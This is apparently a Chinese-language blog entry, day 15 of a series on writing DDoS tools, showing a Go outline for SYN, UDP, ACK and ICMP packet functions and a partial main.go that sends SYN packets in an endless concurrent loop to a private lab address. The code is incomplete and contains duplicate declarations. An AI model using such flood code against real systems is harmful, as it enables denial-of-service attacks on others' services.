---
author: Sunny Tsai
title: "[Day 15] 閑著沒事就寫寫code"
date: 2023-09-28
math: true
tags: [
    "cloud",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
已經大致寫好了SYN、UDP、ACK、ICMP封包

先把做好的封包都做整理
```
package packet

// tcp packet func

// udp packet func

// ack packet func

// icmp packet func

// connectTo func
// syn,

// sendTo func
// udp, icmp

// sendPacketData (gopacket)
// ack
```

```main.go
package main

// @title   buildSynPacket
// @description   Build a syn packet with sys/unix
// @auth     Sunny Tsai     Time(2023/09/25)
// @param    targetIP        string        send to target ip address
// @param    targetPort      int           send to target port
func buildSynPacket(targetIp string, targetPort int) {

	err := packet.Syn(targetIp, targetPort)
	if err != nil {
		fmt.Println(err)
	}
}
...依此類推

func main() {
	targetIp := "10.211.55.10"
	targetPort := 12345

    var wg sync.WaitGroup
	defer wg.Done()

	targetIp := "10.211.55.10"
	targetPort := 12345

	// Layer 4
	synch := make(chan int)
	go func() {
		for {
			buildSynPacket(targetIp, targetPort)
			synch <- 1
		}
	}()

	go func() {
		countSyn := 0

		for {
			select {
			case <-synch:
				countSyn++
			}
		}
	}()
```

在main.go裡面增加併發，並記錄syn封包丟出的次數。
今天先寫到這裡，這兩天有點事QQ
